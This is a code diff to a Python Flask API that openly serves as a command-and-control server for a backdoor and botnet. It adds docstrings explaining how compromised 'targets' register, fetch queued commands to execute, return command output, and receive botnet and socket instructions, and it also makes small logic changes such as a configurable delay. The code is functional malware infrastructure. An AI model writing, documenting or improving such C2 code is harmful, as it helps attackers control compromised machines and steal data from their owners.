@@ -44,6 +44,14 @@ api = Blueprint('api', __name__)
 # recive excute command from the backdoor
 @api.route('/api/ApiCommand/<target_name>')
 def apiCommand(target_name):
+    """
+    API endpoint to receive and execute commands from the backdoor.
+    Args:
+        target_name (str): The name of the target for which commands are being requested.
+    Returns:
+        JSON response containing all commands for the target if the API token is valid.
+        If the API token is invalid or not provided, returns an error message.
+    """
     if request.method == 'GET':
         try:
             api_token = request.args.get('token')
@@ -54,10 +62,12 @@ def apiCommand(target_name):
             if valid:
                 apiCommand = getlist(_session.query(APICommand).filter_by(
                         target_name=target_name,
-                        condition=config.STUTAS[1]
+                        condition=config.STUTAS[1],
+                        update = config.CHECK_UPDATE[1]
                     ).all(),
                     sp=',',
                 )
+                print(apiCommand)
                 if IP != readFromJson('target-info', target_name)['ip']:
                     update_target_info(target_name, IP, opreatingSystem)
                 return jsonify({'allCommand': apiCommand}), 200
@@ -75,6 +85,21 @@ def apiCommand(target_name):
 
 @api.route('/api/Apicommand/save_output', methods=['POST'])
 def save_output():
+    """API endpoint to save command outputs from targets.
+    This endpoint receives command outputs from targets and updates the database accordingly.
+    It checks the validity of the provided token and target name, updates the command status,
+    and saves the output to the database.
+    Args:
+        token (str): The API token for authentication.
+        target_name (str): The name of the target for which outputs are being saved.
+        output (list): The list of command outputs to be saved.
+        ip (str): The IP address of the target.
+        os (str): The operating system of the target.
+    Returns:
+        JSON response indicating success or failure.
+    If the token and target name are valid, it returns a success message.
+    If the token or target name is invalid, it returns an error message.
+    """
     if request.method == 'POST':
         try:
             token = request.json.get('token')
@@ -110,6 +135,13 @@ def save_output():
 
 @api.route('/api/BotNet/<target_name>')
 def BotNet(target_name):
+    """API endpoint to retrieve botnet information for a given target.
+    Args:
+        target_name (str): The name of the target for which botnet information is being requested.
+    Returns:
+        JSON response containing botnet information for the target if the API token is valid.
+        If the API token is invalid or not provided, returns an error message.
+    """
     if request.method == 'GET':
         try:
             token = request.args.get('token')
@@ -127,6 +159,19 @@ def BotNet(target_name):
 
 @api.route('/api/registor_target', methods=['POST'])
 def registor_target():
+    """API endpoint to register a new target with the API.
+    This endpoint allows a new target to be registered by providing an API token,
+    target name, IP address, and operating system.
+    Args:
+        token (str): The API token for authentication.
+        target_name (str): The name of the target to be registered.
+        ip (str): The IP address of the target.
+        os (str): The operating system of the target.
+    Returns:
+        JSON response indicating success or failure.
+        If the API token is valid and the target is registered successfully, it returns the target name.
+        If the API token or target name is invalid or not provided, it returns an error message.
+    """
     if request.method == 'POST':
         try:
             apitoken = request.json.get('token')
@@ -145,9 +190,9 @@ def registor_target():
                 _session.commit()
                 update_target_info(target_name, IP, opratingSystem)
 
-                botNet = Instraction(config.ID(), 300, target_name, config.INSTRACTION[2], config.STUTAS[1])
-                sock = Instraction(config.ID(), 300, target_name, config.INSTRACTION[1], config.STUTAS[1])
-                web = Instraction(config.ID(), 300, target_name, config.INSTRACTION[0], config.STUTAS[1])
+                botNet = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[2], config.STUTAS[1])
+                sock = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[1], config.STUTAS[1])
+                web = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[0], config.STUTAS[1])
 
                 _session.add(botNet)
                 _session.add(sock)
@@ -168,6 +213,15 @@ def registor_target():
 
 @api.route('/api/get_instraction/<target_name>')
 def instarction(target_name):
+    """API endpoint to retrieve instructions for a given target.
+    This endpoint allows clients to retrieve instructions for a specific target
+    by providing the target name and API token.
+    Args:
+        target_name (str): The name of the target for which instructions are being requested.
+    Returns:
+        JSON response containing the delay and instruction for the target if the API token is valid.
+        If the API token is invalid or not provided, returns an error message.
+    """
     if request.method == 'GET':
         try:
             token = request.args.get('token')
@@ -193,6 +247,16 @@ def instarction(target_name):
 
 @api.route("/api/socket/<target_name>", methods=['GET', 'POST'])
 def socket(target_name=None):
+    """API endpoint to manage socket connections for targets.
+    This endpoint allows clients to connect or disconnect from a target's socket
+    and retrieve the current socket status.
+    Args:
+        target_name (str): The name of the target for which socket management is being requested.
+    Returns:
+        JSON response indicating the status of the socket connection.
+        If the request is a POST request, it updates the socket status based on the provided token.
+        If the request is a GET request, it retrieves the current socket status for the target.
+    """
     if request.method == "POST":
         is_connect = request.json.get('is_connect')
         token = request.json.get('token')
